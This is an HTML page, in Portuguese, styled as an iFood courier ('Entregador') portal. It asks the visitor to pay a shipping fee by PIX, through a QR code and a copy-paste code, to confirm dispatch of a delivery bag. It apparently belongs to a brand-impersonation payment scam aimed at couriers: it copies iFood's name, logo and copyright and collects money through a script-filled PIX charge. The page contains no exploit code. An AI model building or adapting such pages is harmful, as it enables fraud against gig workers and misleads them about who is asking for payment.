<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Pagamento PIX</title>
    <meta name="description" content="Pague o frete via PIX para confirmar o envio da sua bag.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css?v=3.1">
</head>

<body data-page="pix">
    

    <header class="header">
        <div class="logo-container">
            <img src="assets/ifoodentregadores.png" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step" aria-hidden="false">
            <div class="step-header">
                <span class="step-count">Pagamento</span>
                <div class="progress-bar">
                    <div class="progress" style="width: 100%"></div>
                </div>
            </div>

            <h2>Pagamento do Frete via PIX</h2>
            <p>Escaneie o QR code ou copie o código abaixo para concluir.</p>

            <div id="pix-empty" class="pix-empty hidden">
                <p>Não encontramos uma cobrança PIX ativa para este pedido.</p>
                <a class="btn-secondary" href="checkout.html">Voltar ao pedido</a>
            </div>

            <div id="pix-card" class="pix-card">
                <div class="pix-qr">
                    <img id="pix-qr" alt="QR Code Pix">
                </div>

                <div class="pix-amount">
                    Total do frete: <strong id="pix-amount">R$ 0,00</strong>
                </div>

                <div class="pix-code">
                    <span class="pix-label">Pix copia e cola</span>
                    <div class="pix-code-row">
                        <textarea id="pix-code" class="pix-textarea" rows="3" readonly></textarea>
                        <button id="btn-copy-pix" class="btn-secondary" type="button">Copiar</button>
                    </div>
                </div>

                <p id="pix-status" class="small-text">Aguardando pagamento do frete.</p>
            </div>
        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js" defer></script>
</body>

</html>
